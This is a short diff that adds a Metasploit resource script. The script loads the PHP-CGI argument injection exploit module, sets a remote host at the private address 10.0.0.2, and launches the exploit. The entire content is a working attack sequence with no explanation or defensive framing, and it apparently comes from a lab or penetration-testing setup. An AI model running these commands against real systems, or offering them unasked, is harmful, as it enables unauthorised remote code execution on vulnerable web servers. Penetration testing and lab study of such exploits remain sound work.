@@ -1,0 +1,4 @@
+use exploit/multi/http/php_cgi_arg_injection
+y
+set RHOST 10.0.0.2
+exploit
